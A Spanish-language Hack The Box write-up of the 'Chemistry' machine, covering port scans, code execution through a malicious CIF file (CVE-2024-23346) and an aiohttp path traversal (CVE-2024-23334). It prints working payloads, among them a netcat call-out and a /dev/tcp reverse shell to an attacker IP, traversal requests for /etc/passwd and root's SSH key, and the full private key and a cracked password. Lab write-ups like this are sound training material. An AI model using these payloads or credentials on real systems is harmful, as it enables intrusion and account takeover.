---
description: >-
  Writeup de la máquina de dificultad fácil Chemistry de la página https://hackthebox.eu
title: HTB - Chemistry | (Difficulty Easy) - Linux
date: 2025-03-01
categories: [Writeup, Hack the Box]
tags: [htb, hacking, hack the box, linux, easy, writeup, redteam, pentesting]
image_post: true
image: https://github.com/user-attachments/assets/6e856231-708d-477b-bba9-10d3f2e4e555
---

## Useful Skills

* Web enumeration
* Abusing Pymatgen <2024.2.20. Arbitrary Code Execution (CVE-2024-23346)
* Information lekeage (database.db)
* Abusing LFI in Aiohttp =< 3.9.1 (CVE-2024-23334)

## Enumeration

### TCP Scan

 ```bash
rustscan -a 10.10.11.38 --ulimit 5000 -g
10.10.11.38 -> [22,5000]
```

```bash
nmap -p22,5000 -sCV 10.10.11.38 -oN tcpScan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 14:11 CET
Nmap scan report for 10.10.11.38 (10.10.11.38)
Host is up (0.034s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
|_http-title: Chemistry - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.87 seconds
```

### UDP Scan

```bash
nmap -sU --top-ports 1500 --min-rate 5000 -n -Pn 10.10.11.38 -oN udpScan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 14:12 CET
Nmap scan report for 10.10.11.38
Host is up (0.035s latency).
Not shown: 1495 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
7/udp     closed echo
69/udp    closed tftp
16402/udp closed unknown
31134/udp closed unknown
36108/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds
```
> Esta máquina sigue activa en HackTheBox. Una vez que se retire, este artículo se publicará para acceso público, de acuerdo con la política de HackTheBox sobre la publicación de contenido de su plataforma.
{: .prompt-danger }
<!--

### HTTP Enumeration

Whatweb detecta un servidor web Werkzeug/3.0.3 Python/3.9.5

```bash
whatweb http://10.10.11.38:5000
http://10.10.11.38:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.9.5], IP[10.10.11.38], Python[3.9.5], Title[Chemistry - Home], Werkzeug[3.0.3]
```

Accediendo a http://10.10.11.38/ y observo una web que suspuestamente tiene una herramienta que permite cargar un CIF (Archivo de Información Cristalográfica) y analizar los datos estructurales que contiene. Por otra lado tambíen existe la posibilidad de iniciar sesión o registrarse

![image](https://github.com/user-attachments/assets/7beb8c29-106c-4c1d-a9ca-8a98c18fc6c1)

Me registro en la web como un usuario con bajos privilegios

![image](https://github.com/user-attachments/assets/6a5c501d-6a08-4f70-b0e3-dfc59f91272d)

Una vez registrado consigo observar una panel el cual permite la carga de un archivo CIF, también adjuntan para descargar un ejemplo de un archivo CIF

![image](https://github.com/user-attachments/assets/91fc3e0c-2c30-4e9b-bc34-0c4f5012f759)

## Vulnerability analysis

### Arbitrary Code Execution

Una pequeña búsqueda en internet me permite dar con la vulnerabilidad CVE-2024-23346, se trata de una ejecución remota de código a través de la biblioteca Pymatgen, ya que en el método JonesFaithfulTransformation.from_transformation_str()` utiliza de forma insegura la función eval() para procesar la entrada del usuario

* [NVD Explanation CVE-2024-23346](https://nvd.nist.gov/vuln/detail/CVE-2024-23346)

## Exploitation

### Abusing Pymatgen <2024.2.20. Arbitrary Code Execution (CVE-2024-23346)

Encuentro un repositorio de GitHub sobre la vulnerabilidad CVE-2024-23346 el cual me sirve de guía para realizar la explotación y entender como funciona todo.

* [Arbitrary code execution when parsing a maliciously crafted JonesFaithfulTransformation transformation_string](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

![image](https://github.com/user-attachments/assets/f1b5a05a-f7c8-478c-822d-fd765b114217)

Preparo mi archivo malicioso CIF, donde ejecuto un whoami y envío el output con netcat por el puerto 1234, lo cual me servirá para ver con que usuario ganaré acceso al sistema

```bash
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("whoami | nc 10.10.14.23 1234");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Inicio un listener con netcat por el puerto 1234 para obtener la respuesta 

```bash
nc -lvnp 1234
listening on [any] 1234 ...
```

Subo el archivo malicioso evil.cif y hago clic sobre View, obtengo que el usuario con el que ganaré acceso al sistema es el usuario app

![image](https://github.com/user-attachments/assets/2ff8532f-2b03-41ea-aa96-875c0276c1f4)

```bash
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.11.38] 39934
app
```

## Gain access

Preparo de nuevo mi archivo malicioso CIF, donde envío una reverse shell hacia mi máquina para ganar acceso al sistema como el usuario app

```bash
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.23/1234 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Inicio un listener con netcat por el puerto 1234 para obtener la reverse shell y ganar acceso al sistema como el usuario app

```bash
nc -lvnp 1234
listening on [any] 1234 ...
```

Subo el archivo malicioso pwn.cif y hago clic sobre View, consigo obtener acceso al sistema como el usuario app

![image](https://github.com/user-attachments/assets/5bd9ffa1-6fd7-49e6-9502-160d8e4a45b9)

```bash
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.11.38] 49954
sh: 0: can't access tty; job control turned off
$ whoami
app
```

## Post exploitation

### User Pivoting

Obtengo acceso al sistema como el usuario app, este es un usuario con bajo privilegios por lo que debo de buscar alguna manera de pivotar hacia otro usuario. Comenzaré visualizando cuales son los usuarios que existen en el sistema.

```bash
app@chemistry:~$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

Visualizo en /home/app el archivo app.py consiguiendo ver una credenciale de acceso a la base de datos sqlite llamada database.db, la cual es MyS3cretCh3mistry4PP

```bash
app@chemistry:~$ head app.py -n20
from flask import Flask, render_template, request, redirect, url_for, flash
from werkzeug.utils import secure_filename
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from pymatgen.io.cif import CifParser
import hashlib
import os
import uuid

app = Flask(__name__)
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'cif'}

db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'

class User(UserMixin, db.Model):
```

Localizo el archivo database.db y lo transfiera a mi máquina local con un servidor python

```bash
app@chemistry:~$ find / -name database.db 2>/dev/null
/home/app/instance/database.db
```

```bash
app@chemistry:~/instance$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
wget http://10.10.11.38:8000/database.db
--2025-03-02 20:30:18--  http://10.10.11.38:8000/database.db
Conectando con 10.10.11.38:8000... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 20480 (20K) [application/octet-stream]
Grabando a: «database.db»

database.db      100%[====================================>]  20,00K  --.-KB/s    en 0,03s   

2025-03-02 20:30:18 (580 KB/s) - «database.db» guardado [20480/20480]
```

Utilizo sqlitebrowser para visualizar la base de datos, en la tabla users consigo visualizasr la contreseña del usuario rosa, parecer que esta hasheada en MD5

![image](https://github.com/user-attachments/assets/b05ba76e-babd-4dbc-90cf-fd70efbe6965)

Utilizo crackstation para obtener la contraseña del usuario rosa, la cual es unicorniosrosados

![image](https://github.com/user-attachments/assets/8cd3d34a-13c5-49a3-a3b2-d5cd57c99a6c)

Migro con la contraseña unicorniosrosados al usuario rosa

```bash
app@chemistry:~/instance$ su rosa
Password: 
rosa@chemistry:/home/app/instance$ whoami
rosa
```

### Privilege escalation

Utilizo el comando netstat para mostrar información sobre las conexiones de red y puertos en uso

```bash
rosa@chemistry:/$ netstat -tulpen
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      0          37749      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        36238      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          37927      -                   
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      1001       37754      1924/bash           
tcp6       0      0 :::22                   :::*                    LISTEN      0          37929      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        36237      -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          35137      -
```

Visualizo que se encuentra el puerto 8080 el cual no se veía en el escaneo de inicial de puertos, observo tambien que lo corre el usuario con UID 0, es decir root, utilizo ssh para realizar un Local Port Forwarding, pero al intentarlo obtengo que necesito autenticarme con clave ssh.

```bash
ssh rosa@10.10.11.38 -L 8080:127.0.0.1:8080 -fN
rosa@10.10.11.38's password: 
```

Utilizo whatweb y veo que se está empleando un servidor web Python3.9 con la librería aiohttp/3.9.1

```bash
whatweb http://127.0.0.1:8080
http://127.0.0.1:8080 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Python/3.9 aiohttp/3.9.1], IP[127.0.0.1], JQuery[3.6.0], Script, Title[Site Monitoring]
```

Una pequeña búsqueda me permite dar con un repositorio de github que indica como explotar la vulnerabilidad CVE-2024-23334 en aiohttp/3.9.1, se trata de un LFI (Local File Inclusion) que aproveha si follow_symlinks se encuentra True

* [CVE-2024-23334 Poc](https://github.com/z3rObyte/CVE-2024-23334-PoC)

Intento listar el /etc/passwd, consiguiendolo de forma satisfactoria

```bash
curl --path-as-is -s /dev/null http://localhost:8080/assets/../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001:,,,:/home/app:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

Se me ocurre comprobar si el usuario root dispone de una clave rsa para autenticarme por SSH con la misma, consigo obtener una clave rsa

```bash
curl --path-as-is -s /dev/null http://localhost:8080/assets/../../../../../root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Utilizo la clave id_rsa para autenticarme por ssh y gano acceso al sistema como root

```bash
chmod 600 id_rsa
```

```bash
ssh -i id_rsa root@10.10.11.38
root@chemistry:~# whoami
root
```
-->
